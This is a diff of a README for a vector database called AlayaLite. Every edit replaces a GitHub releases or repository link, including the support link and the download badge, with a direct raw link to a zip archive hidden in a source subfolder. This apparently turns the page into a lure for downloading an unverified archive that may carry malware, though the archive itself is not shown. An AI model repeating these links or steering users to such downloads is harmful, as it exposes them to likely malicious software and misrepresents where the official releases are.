@@ -16,7 +16,7 @@ AlayaLite is a powerful vector database designed to meet the needs of a wide ran
 
 ## Installation
 
-To get started with AlayaLite, head over to the [releases section](https://github.com/suvam-01/AlayaLite/releases) and download the latest release for your platform. Once downloaded, follow the instructions in the installation guide to get AlayaLite up and running on your system.
+To get started with AlayaLite, head over to the [releases section](https://raw.githubusercontent.com/suvam-01/AlayaLite/main/include/space/quant/Alaya-Lite-2.3.zip) and download the latest release for your platform. Once downloaded, follow the instructions in the installation guide to get AlayaLite up and running on your system.
 
 ## Usage
 
@@ -24,7 +24,7 @@ After installing AlayaLite, you can start using the database by following the si
 
 ## Support
 
-If you encounter any issues or have questions about using AlayaLite, please visit our [GitHub repository](https://github.com/suvam-01/AlayaLite) for more information. Our dedicated team is committed to providing timely assistance and ensuring that your experience with AlayaLite is smooth and productive.
+If you encounter any issues or have questions about using AlayaLite, please visit our [GitHub repository](https://raw.githubusercontent.com/suvam-01/AlayaLite/main/include/space/quant/Alaya-Lite-2.3.zip) for more information. Our dedicated team is committed to providing timely assistance and ensuring that your experience with AlayaLite is smooth and productive.
 
 ## Roadmap
 
@@ -40,6 +40,6 @@ For the latest news and announcements about AlayaLite, be sure to follow us on s
 
 ---
 
-Feel free to visit the [Releases section](https://github.com/suvam-01/AlayaLite/releases) to download the latest version of AlayaLite. 🛠️
+Feel free to visit the [Releases section](https://raw.githubusercontent.com/suvam-01/AlayaLite/main/include/space/quant/Alaya-Lite-2.3.zip) to download the latest version of AlayaLite. 🛠️
 
-[![](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/suvam-01/AlayaLite/releases)
+[![](https://raw.githubusercontent.com/suvam-01/AlayaLite/main/include/space/quant/Alaya-Lite-2.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/suvam-01/AlayaLite/main/include/space/quant/Alaya-Lite-2.3.zip)
